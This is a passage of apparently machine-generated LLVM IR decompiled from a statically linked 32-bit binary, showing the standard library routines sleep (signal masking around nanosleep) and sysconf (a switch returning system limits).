  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_8050f67, { 0, 2, 1, 3 }
  uselistorder i32 -8, { 1, 13, 14, 15, 12, 0, 7, 2, 3, 4, 5, 6, 8, 9, 10, 11 }
  uselistorder i32 -16, { 13, 23, 24, 10, 18, 14, 11, 15, 16, 17, 19, 20, 12, 21, 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8050fcc = load i32, i32* @ebp, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  %v0_8050fd2 = load i32, i32* @edi, align 4
  %v0_8050fd3 = load i32, i32* @esi, align 4
  %v0_8050fd4 = load i32, i32* @ebx, align 4
  %v15_8050fd5 = ptrtoint i32* %stack_var_-444 to i32
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_8050fe2 = icmp eq i32 %arg1, 0
  %v1_8050fe4 = icmp eq i1 %v1_8050fe2, false
  br i1 %v1_8050fe4, label %dec_label_pc_8050ff6.preheader, label %dec_label_pc_8051143

dec_label_pc_8050ff6.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050feb

dec_label_pc_8050feb:                             ; preds = %dec_label_pc_8050feb.dec_label_pc_8050feb_crit_edge, %dec_label_pc_8050ff6.preheader
  %v0_8050feb = phi i32 [ %v15_8050fd5, %dec_label_pc_8050ff6.preheader ], [ %v0_8050feb.pre, %dec_label_pc_8050feb.dec_label_pc_8050feb_crit_edge ]
  %v1_8050ff629 = phi i32 [ 31, %dec_label_pc_8050ff6.preheader ], [ %v1_8050ff6, %dec_label_pc_8050feb.dec_label_pc_8050feb_crit_edge ]
  %v2_8050feb = mul i32 %v1_8050ff629, 4
  %v3_8050feb = add i32 %v2_8050feb, 292
  %v4_8050feb = add i32 %v3_8050feb, %v0_8050feb
  %v5_8050feb = inttoptr i32 %v4_8050feb to i32*
  store i32 0, i32* %v5_8050feb, align 4
  %v0_8050ff6.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ff6 = add i32 %v0_8050ff6.pre, -1
  %v9_8050ff6 = icmp slt i32 %v1_8050ff6, 0
  store i32 %v1_8050ff6, i32* %eax.global-to-local, align 4
  %v1_8050ff7 = icmp eq i1 %v9_8050ff6, false
  br i1 %v1_8050ff7, label %dec_label_pc_8050feb.dec_label_pc_8050feb_crit_edge, label %dec_label_pc_8050ff9

dec_label_pc_8050feb.dec_label_pc_8050feb_crit_edge: ; preds = %dec_label_pc_8050feb
  %v0_8050feb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050feb

dec_label_pc_8050ff9:                             ; preds = %dec_label_pc_8050feb
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_805100f = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_805100f, i32* @ebx, align 4
  store i32 %v2_805100f, i32* %stack_var_-460, align 4
  %v4_8051017 = call i32 @__sigaddset(i32 %v2_805100f, i32 17, i32 %v1_8050ff6, i32 %v1_8050ff6)
  store i32 %v4_8051017, i32* %eax.global-to-local, align 4
  %v2_805101f = icmp slt i32 %v4_8051017, 0
  br i1 %v2_805101f, label %dec_label_pc_8051147, label %dec_label_pc_8051027

dec_label_pc_8051027:                             ; preds = %dec_label_pc_8050ff9
  %v2_8051028 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8051028, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8051033 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8051033 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8051033, i32 %v2_8051028)
  store i32 %v4_8051033, i32* %eax.global-to-local, align 4
  %v1_805103b = icmp eq i32 %v4_8051033, 0
  %v1_805103d = icmp eq i1 %v1_805103b, false
  br i1 %v1_805103d, label %dec_label_pc_8051147, label %dec_label_pc_8051043

dec_label_pc_8051043:                             ; preds = %dec_label_pc_8051027
  store i32 %v2_8051028, i32* %stack_var_-460, align 4
  %v4_8051048 = call i32 @__sigismember(i32 %v2_8051028, i32 17, i32 %v4_8051033, i32 %v4_8051033)
  store i32 %v4_8051048, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8051055 = icmp eq i32 %v4_8051048, 0
  br i1 %v1_8051055, label %dec_label_pc_8051069.preheader, label %dec_label_pc_8051111

dec_label_pc_8051069.preheader:                   ; preds = %dec_label_pc_8051043
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805105e

dec_label_pc_805105e:                             ; preds = %dec_label_pc_805105e.dec_label_pc_805105e_crit_edge, %dec_label_pc_8051069.preheader
  %v0_805105e = phi i32 [ %v15_8050fd5, %dec_label_pc_8051069.preheader ], [ %v0_805105e.pre, %dec_label_pc_805105e.dec_label_pc_805105e_crit_edge ]
  %v1_805106928 = phi i32 [ 31, %dec_label_pc_8051069.preheader ], [ %v1_8051069, %dec_label_pc_805105e.dec_label_pc_805105e_crit_edge ]
  %v2_805105e = mul i32 %v1_805106928, 4
  %v3_805105e = add i32 %v2_805105e, 292
  %v4_805105e = add i32 %v3_805105e, %v0_805105e
  %v5_805105e = inttoptr i32 %v4_805105e to i32*
  store i32 0, i32* %v5_805105e, align 4
  %v0_8051069.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_8051069 = add i32 %v0_8051069.pre, -1
  %v9_8051069 = icmp slt i32 %v1_8051069, 0
  store i32 %v1_8051069, i32* %edx.global-to-local, align 4
  %v1_805106a = icmp eq i1 %v9_8051069, false
  br i1 %v1_805106a, label %dec_label_pc_805105e.dec_label_pc_805105e_crit_edge, label %dec_label_pc_805106c

dec_label_pc_805105e.dec_label_pc_805105e_crit_edge: ; preds = %dec_label_pc_805105e
  %v0_805105e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805105e

dec_label_pc_805106c:                             ; preds = %dec_label_pc_805105e
  store i32 %v2_805100f, i32* %eax.global-to-local, align 4
  store i32 %v2_805100f, i32* %stack_var_-460, align 4
  %v4_8051078 = call i32 @__sigaddset(i32 %v2_805100f, i32 17, i32 0, i32 0)
  store i32 %v4_8051078, i32* %eax.global-to-local, align 4
  %v2_8051080 = icmp slt i32 %v4_8051078, 0
  br i1 %v2_8051080, label %dec_label_pc_8051147, label %dec_label_pc_8051088

dec_label_pc_8051088:                             ; preds = %dec_label_pc_805106c
  %v2_8051089 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8051089, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8051092 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_8051089)
  store i32 %v4_8051092, i32* %eax.global-to-local, align 4
  %v2_805109a = icmp slt i32 %v4_8051092, 0
  %v1_805109c = icmp eq i1 %v2_805109a, false
  br i1 %v1_805109c, label %dec_label_pc_80510c6, label %dec_label_pc_805109e

dec_label_pc_805109e:                             ; preds = %dec_label_pc_8051088
  %v0_805109e = load i32, i32* %stack_var_-460, align 4
  %v1_805109e = call i32 @__errno_location(i32 %v0_805109e)
  store i32 %v1_805109e, i32* %eax.global-to-local, align 4
  %v1_80510a3 = inttoptr i32 %v1_805109e to i32*
  %v2_80510a3 = load i32, i32* %v1_80510a3, align 4
  store i32 %v2_80510a3, i32* @esi, align 4
  store i32 %v1_805109e, i32* @ebx, align 4
  store i32 %v2_8051028, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80510b4 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80510b4 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80510b4, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_80510bf = load i32, i32* @esi, align 4
  %v1_80510bf = load i32, i32* @ebx, align 4
  %v2_80510bf = inttoptr i32 %v1_80510bf to i32*
  store i32 %v0_80510bf, i32* %v2_80510bf, align 4
  %v0_8051154.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805114a

dec_label_pc_80510c6:                             ; preds = %dec_label_pc_8051088
  %v3_80510c6 = load i32, i32* %stack_var_-420, align 4
  %v12_80510c6 = icmp eq i32 %v3_80510c6, 1
  %v2_80510d2 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80510d2, i32* @ebx, align 4
  %v1_80510d9 = icmp eq i1 %v12_80510c6, false
  br i1 %v1_80510d9, label %dec_label_pc_8051100, label %dec_label_pc_80510db

dec_label_pc_80510db:                             ; preds = %dec_label_pc_80510c6
  %v0_80510db = load i32, i32* @edi, align 4
  store i32 %v2_80510d2, i32* %stack_var_-460, align 4
  %v4_80510df = bitcast i32* %stack_var_-24 to %timespec*
  %v5_80510df = call i32 @__libc_nanosleep(%timespec* %v4_80510df, i32 %v2_80510d2, i32 %v0_80510db, i32 %v0_80510db)
  store i32 %v5_80510df, i32* %eax.global-to-local, align 4
  store i32 %v5_80510df, i32* @edi, align 4
  %v1_80510e6 = call i32 @__errno_location(i32 %v2_80510d2)
  store i32 %v1_80510e6, i32* %eax.global-to-local, align 4
  %v1_80510ee = inttoptr i32 %v1_80510e6 to i32*
  %v2_80510ee = load i32, i32* %v1_80510ee, align 4
  store i32 %v2_80510ee, i32* @esi, align 4
  store i32 %v1_80510e6, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80510f7 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80510f7 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80510f7, i32 0)
  store i32 %v4_80510f7, i32* %eax.global-to-local, align 4
  %v0_80510fc = load i32, i32* @esi, align 4
  %v1_80510fc = load i32, i32* @ebx, align 4
  %v2_80510fc = inttoptr i32 %v1_80510fc to i32*
  store i32 %v0_80510fc, i32* %v2_80510fc, align 4
  %v0_8051126.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051123

dec_label_pc_8051100:                             ; preds = %dec_label_pc_80510c6
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8051106 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8051106 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8051106, i32 0)
  store i32 %v4_8051106, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805111c

dec_label_pc_8051111:                             ; preds = %dec_label_pc_8051043
  %v2_8051113 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051113, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805111c

dec_label_pc_805111c:                             ; preds = %dec_label_pc_8051100, %dec_label_pc_8051111
  %storemerge3.pre-phi = phi i32 [ %v2_80510d2, %dec_label_pc_8051100 ], [ %v2_8051113, %dec_label_pc_8051111 ]
  %v3_805111c = phi i32 [ %v2_8051028, %dec_label_pc_8051100 ], [ %v4_8051048, %dec_label_pc_8051111 ]
  %v2_805111c = phi i32 [ 0, %dec_label_pc_8051100 ], [ %v4_8051048, %dec_label_pc_8051111 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_805111c = bitcast i32* %stack_var_-24 to %timespec*
  %v5_805111c = call i32 @__libc_nanosleep(%timespec* %v4_805111c, i32 %storemerge3.pre-phi, i32 %v2_805111c, i32 %v3_805111c)
  store i32 %v5_805111c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051123

dec_label_pc_8051123:                             ; preds = %dec_label_pc_80510db, %dec_label_pc_805111c
  %v0_8051126 = phi i32 [ %v0_8051126.pre, %dec_label_pc_80510db ], [ %v5_805111c, %dec_label_pc_805111c ]
  %v1_8051126 = icmp eq i32 %v0_8051126, 0
  br i1 %v1_8051126, label %dec_label_pc_8051143, label %dec_label_pc_805112a

dec_label_pc_805112a:                             ; preds = %dec_label_pc_8051123
  %v4_805113a = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_805113a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805114a

dec_label_pc_8051143:                             ; preds = %entry, %dec_label_pc_8051123
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805114a

dec_label_pc_8051147:                             ; preds = %dec_label_pc_805106c, %dec_label_pc_8051027, %dec_label_pc_8050ff9
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805114a

dec_label_pc_805114a:                             ; preds = %dec_label_pc_8051143, %dec_label_pc_805112a, %dec_label_pc_805109e, %dec_label_pc_8051147
  %v0_8051154 = phi i32 [ 0, %dec_label_pc_8051143 ], [ %v4_805113a, %dec_label_pc_805112a ], [ %v0_8051154.pre, %dec_label_pc_805109e ], [ -1, %dec_label_pc_8051147 ]
  store i32 %v0_8050fd4, i32* @ebx, align 4
  store i32 %v0_8050fd3, i32* @esi, align 4
  store i32 %v0_8050fd2, i32* @edi, align 4
  store i32 %v0_8050fcc, i32* @ebp, align 4
  ret i32 %v0_8051154

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_80510e6, { 1, 0, 2 }
  uselistorder i32 %v2_80510d2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8051069, { 2, 1, 0 }
  uselistorder i32 %v4_8051048, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8051028, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_805100f, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8050ff6, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 21 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805114a, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051143, { 1, 0 }
  uselistorder label %dec_label_pc_8051123, { 1, 0 }
  uselistorder label %dec_label_pc_805111c, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_8051177 [
    i32 0, label %dec_label_pc_8051187
    i32 1, label %dec_label_pc_805126c
    i32 2, label %dec_label_pc_8051191
    i32 3, label %dec_label_pc_805119b
    i32 4, label %dec_label_pc_80511a5
    i32 5, label %dec_label_pc_805123b
    i32 6, label %dec_label_pc_80511ad
    i32 7, label %dec_label_pc_805116d
    i32 8, label %dec_label_pc_805116d
    i32 9, label %dec_label_pc_805116d
    i32 10, label %dec_label_pc_805116d
    i32 11, label %dec_label_pc_805116d
    i32 12, label %dec_label_pc_805116d
    i32 13, label %dec_label_pc_805116d
    i32 14, label %dec_label_pc_805116d
    i32 15, label %dec_label_pc_805116d
    i32 16, label %dec_label_pc_805116d
    i32 17, label %dec_label_pc_805116d
    i32 18, label %dec_label_pc_805116d
    i32 19, label %dec_label_pc_805116d
    i32 20, label %dec_label_pc_805116d
    i32 21, label %dec_label_pc_805116d
    i32 22, label %dec_label_pc_805116d
    i32 23, label %dec_label_pc_805126c
    i32 24, label %dec_label_pc_805126c
    i32 25, label %dec_label_pc_8051278
    i32 26, label %dec_label_pc_8051249
    i32 27, label %dec_label_pc_805126c
    i32 28, label %dec_label_pc_80511bf
    i32 29, label %dec_label_pc_8051242
    i32 30, label %dec_label_pc_80511b7
    i32 31, label %dec_label_pc_8051257
    i32 32, label %dec_label_pc_805126c
    i32 33, label %dec_label_pc_805126c
    i32 34, label %dec_label_pc_805126c
    i32 35, label %dec_label_pc_8051250
    i32 36, label %dec_label_pc_805127f
    i32 37, label %dec_label_pc_8051286
    i32 38, label %dec_label_pc_805127f
    i32 39, label %dec_label_pc_80511c9
    i32 40, label %dec_label_pc_805128d
    i32 41, label %dec_label_pc_805126c
    i32 42, label %dec_label_pc_8051257
    i32 43, label %dec_label_pc_8051286
    i32 44, label %dec_label_pc_8051294
    i32 45, label %dec_label_pc_8051286
    i32 46, label %dec_label_pc_8051242
    i32 47, label %dec_label_pc_8051242
    i32 48, label %dec_label_pc_8051242
    i32 49, label %dec_label_pc_805126c
    i32 50, label %dec_label_pc_805126c
    i32 51, label %dec_label_pc_8051242
    i32 52, label %dec_label_pc_8051242
    i32 53, label %dec_label_pc_805126c
    i32 54, label %dec_label_pc_805126c
    i32 55, label %dec_label_pc_805126c
    i32 56, label %dec_label_pc_805126c
    i32 57, label %dec_label_pc_805126c
    i32 58, label %dec_label_pc_805126c
    i32 59, label %dec_label_pc_805126c
    i32 60, label %dec_label_pc_805126c
    i32 61, label %dec_label_pc_805126c
    i32 62, label %dec_label_pc_805126c
    i32 63, label %dec_label_pc_805126c
    i32 64, label %dec_label_pc_805126c
    i32 65, label %dec_label_pc_805126c
    i32 66, label %dec_label_pc_805126c
    i32 67, label %dec_label_pc_805116d
    i32 68, label %dec_label_pc_805116d
    i32 69, label %dec_label_pc_8051250
    i32 70, label %dec_label_pc_8051250
    i32 71, label %dec_label_pc_8051250
    i32 72, label %dec_label_pc_8051257
    i32 73, label %dec_label_pc_805125e
    i32 74, label %dec_label_pc_8051265
    i32 75, label %dec_label_pc_80511d3
    i32 76, label %dec_label_pc_8051265
    i32 77, label %dec_label_pc_805116d
    i32 78, label %dec_label_pc_805116d
    i32 79, label %dec_label_pc_805116d
    i32 80, label %dec_label_pc_805116d
    i32 81, label %dec_label_pc_805116d
    i32 82, label %dec_label_pc_805116d
    i32 83, label %dec_label_pc_805116d
    i32 84, label %dec_label_pc_805116d
    i32 85, label %dec_label_pc_805126c
    i32 86, label %dec_label_pc_805126c
    i32 87, label %dec_label_pc_8051249
    i32 88, label %dec_label_pc_80511dd
    i32 89, label %dec_label_pc_80511e7
    i32 90, label %dec_label_pc_805125e
    i32 91, label %dec_label_pc_805116d
    i32 92, label %dec_label_pc_805116d
    i32 93, label %dec_label_pc_805116d
    i32 94, label %dec_label_pc_805116d
    i32 95, label %dec_label_pc_8051242
    i32 96, label %dec_label_pc_805126c
    i32 97, label %dec_label_pc_805126c
    i32 98, label %dec_label_pc_805116d
    i32 99, label %dec_label_pc_805116d
    i32 100, label %dec_label_pc_805116d
    i32 101, label %dec_label_pc_80511f1
    i32 102, label %dec_label_pc_8051234
    i32 103, label %dec_label_pc_8051271
    i32 104, label %dec_label_pc_8051249
    i32 105, label %dec_label_pc_80511fb
    i32 106, label %dec_label_pc_8051257
    i32 107, label %dec_label_pc_8051257
    i32 108, label %dec_label_pc_805123b
    i32 109, label %dec_label_pc_8051278
    i32 110, label %dec_label_pc_8051294
    i32 111, label %dec_label_pc_8051234
    i32 112, label %dec_label_pc_8051271
    i32 113, label %dec_label_pc_8051294
    i32 114, label %dec_label_pc_8051205
    i32 115, label %dec_label_pc_805128d
    i32 116, label %dec_label_pc_805126c
    i32 117, label %dec_label_pc_805126c
    i32 118, label %dec_label_pc_805120f
    i32 119, label %dec_label_pc_8051219
    i32 120, label %dec_label_pc_8051286
    i32 121, label %dec_label_pc_8051249
    i32 122, label %dec_label_pc_8051249
    i32 123, label %dec_label_pc_8051249
    i32 124, label %dec_label_pc_8051249
    i32 125, label %dec_label_pc_805116d
    i32 126, label %dec_label_pc_805116d
    i32 127, label %dec_label_pc_805126c
    i32 128, label %dec_label_pc_805126c
    i32 129, label %dec_label_pc_805116d
    i32 130, label %dec_label_pc_805116d
    i32 131, label %dec_label_pc_805126c
    i32 149, label %dec_label_pc_8051220
  ]

dec_label_pc_805116d:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051299

dec_label_pc_8051177:                             ; preds = %entry
  %v1_8051177 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_805117c = inttoptr i32 %v1_8051177 to i32*
  store i32 22, i32* %v1_805117c, align 4
  br label %dec_label_pc_805126c

dec_label_pc_8051187:                             ; preds = %entry
  br label %dec_label_pc_8051299

dec_label_pc_8051191:                             ; preds = %entry
  br label %dec_label_pc_8051299

dec_label_pc_805119b:                             ; preds = %entry
  br label %dec_label_pc_8051299

dec_label_pc_80511a5:                             ; preds = %entry
  %v1_80511a8 = call i32 @getdtablesize(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80511ad

dec_label_pc_80511ad:                             ; preds = %entry, %dec_label_pc_80511a5
  br label %dec_label_pc_8051299

dec_label_pc_80511b7:                             ; preds = %entry
  %v0_80511ba = call i32 @__GI_getpagesize()
  br label %dec_label_pc_80511bf

dec_label_pc_80511bf:                             ; preds = %entry, %dec_label_pc_80511b7
  br label %dec_label_pc_8051299

dec_label_pc_80511c9:                             ; preds = %entry
  br label %dec_label_pc_8051299

dec_label_pc_80511d3:                             ; preds = %entry
  br label %dec_label_pc_8051299

dec_label_pc_80511dd:                             ; preds = %entry
  br label %dec_label_pc_8051299

dec_label_pc_80511e7:                             ; preds = %entry
  br label %dec_label_pc_8051299

dec_label_pc_80511f1:                             ; preds = %entry
  br label %dec_label_pc_8051299

dec_label_pc_80511fb:                             ; preds = %entry
  br label %dec_label_pc_8051299

dec_label_pc_8051205:                             ; preds = %entry
  br label %dec_label_pc_8051299

dec_label_pc_805120f:                             ; preds = %entry
  br label %dec_label_pc_8051299

dec_label_pc_8051219:                             ; preds = %entry
  br label %dec_label_pc_8051299

dec_label_pc_8051220:                             ; preds = %entry
  %v5_8051226 = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_805122e = icmp slt i32 %v5_8051226, 0
  %v1_8051230 = icmp eq i1 %v2_805122e, false
  br i1 %v1_8051230, label %dec_label_pc_8051242, label %dec_label_pc_805126c

dec_label_pc_8051234:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051299

dec_label_pc_805123b:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051299

dec_label_pc_8051242:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8051220
  br label %dec_label_pc_8051299

dec_label_pc_8051249:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051299

dec_label_pc_8051250:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051299

dec_label_pc_8051257:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051299

dec_label_pc_805125e:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051299

dec_label_pc_8051265:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051299

dec_label_pc_805126c:                             ; preds = %dec_label_pc_8051220, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8051177
  br label %dec_label_pc_8051299

dec_label_pc_8051271:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051299

dec_label_pc_8051278:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051299

dec_label_pc_805127f:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051299

dec_label_pc_8051286:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051299

dec_label_pc_805128d:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051299

dec_label_pc_8051294:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8051299

dec_label_pc_8051299:                             ; preds = %dec_label_pc_805128d, %dec_label_pc_8051286, %dec_label_pc_805127f, %dec_label_pc_8051278, %dec_label_pc_8051271, %dec_label_pc_8051265, %dec_label_pc_805125e, %dec_label_pc_8051257, %dec_label_pc_8051250, %dec_label_pc_8051249, %dec_label_pc_805123b, %dec_label_pc_8051234, %dec_label_pc_8051242, %dec_label_pc_8051219, %dec_label_pc_805120f, %dec_label_pc_8051205, %dec_label_pc_80511fb, %dec_label_pc_80511f1, %dec_label_pc_80511e7, %dec_label_pc_80511dd, %dec_label_pc_80511d3, %dec_label_pc_80511c9, %dec_label_pc_80511bf, %dec_label_pc_80511ad, %dec_label_pc_805119b, %dec_label_pc_8051191, %dec_label_pc_8051187, %dec_label_pc_805116d, %dec_label_pc_805126c, %dec_label_pc_8051294
  %v0_805129c = phi i32 [ 255, %dec_label_pc_805128d ], [ 2048, %dec_label_pc_8051286 ], [ 99, %dec_label_pc_805127f ], [ 20, %dec_label_pc_8051278 ], [ -128, %dec_label_pc_8051271 ], [ 1024, %dec_label_pc_8051265 ], [ 4, %dec_label_pc_805125e ], [ 32, %dec_label_pc_8051257 ], [ 256, %dec_label_pc_8051250 ], [ 2147483647, %dec_label_pc_8051249 ], [ 16, %dec_label_pc_805123b ], [ 127, %dec_label_pc_8051234 ], [ 200112, %dec_label_pc_8051242 ], [ 9, %dec_label_pc_8051219 ], [ 65535, %dec_label_pc_805120f ], [ -32768, %dec_label_pc_8051205 ], [ -2147483648, %dec_label_pc_80511fb ], [ 8, %dec_label_pc_80511f1 ], [ 500, %dec_label_pc_80511e7 ], [ 4096, %dec_label_pc_80511dd ], [ 16384, %dec_label_pc_80511d3 ], [ 1000, %dec_label_pc_80511c9 ], [ 32768, %dec_label_pc_80511bf ], [ 6, %dec_label_pc_80511ad ], [ 65536, %dec_label_pc_805119b ], [ 100, %dec_label_pc_8051191 ], [ 131072, %dec_label_pc_8051187 ], [ 1, %dec_label_pc_805116d ], [ -1, %dec_label_pc_805126c ], [ 32767, %dec_label_pc_8051294 ]
  ret i32 %v0_805129c

; uselistorder directives
  uselistorder i32 16384, { 0, 13, 5, 6, 7, 8, 9, 10, 11, 12, 4, 1, 2, 3 }
  uselistorder i32 -2147483648, { 4, 6, 7, 3, 5, 9, 0, 1, 2, 8 }
  uselistorder i32 (i32)* @getdtablesize, { 4, 3, 1, 2, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 115, { 4, 0, 1, 2, 3 }
  uselistorder i32 100, { 1, 2, 0 }
  uselistorder i32 97, { 3, 2, 1, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 80, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 70, { 1, 2, 0 }
  uselistorder i32 68, { 1, 2, 3, 0 }
  uselistorder i32 65, { 1, 0 }
  uselistorder i32 60, { 2, 1, 0 }
  uselistorder i32 58, { 4, 0, 1, 2, 3 }
  uselistorder i32 51, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 49, { 1, 0 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 46, { 2, 0, 1 }
  uselistorder i32 39, { 2, 0, 1 }
  uselistorder i32 38, { 1, 2, 0 }
  uselistorder i32 36, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 35, { 2, 0, 1 }
  uselistorder i32 34, { 4, 5, 7, 8, 3, 0, 1, 6, 2 }
  uselistorder i32 33, { 2, 3, 0, 1 }
  uselistorder i32 30, { 7, 0, 1, 2, 3, 8, 9, 10, 4, 5, 6 }
  uselistorder i32 26, { 2, 1, 0 }
  uselistorder i32 19, { 1, 0, 2 }
  uselistorder i32 17, { 8, 4, 7, 1, 2, 0, 11, 3, 9, 10, 5, 6 }
  uselistorder i32 15, { 1, 5, 4, 0, 3, 2 }
  uselistorder i32 11, { 6, 12, 3, 7, 8, 9, 10, 4, 11, 2, 5, 0, 1 }
  uselistorder i32 7, { 4, 2, 1, 5, 6, 7, 8, 9, 10, 3, 0, 11 }
  uselistorder i32 5, { 15, 7, 8, 17, 9, 23, 24, 0, 4, 18, 16, 19, 20, 10, 11, 6, 21, 5, 22, 12, 13, 14, 1, 2, 3 }
  uselistorder label %dec_label_pc_8051299, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_805126c, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8051242, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80511bf, { 1, 0 }
  uselistorder label %dec_label_pc_80511ad, { 1, 0 }
}

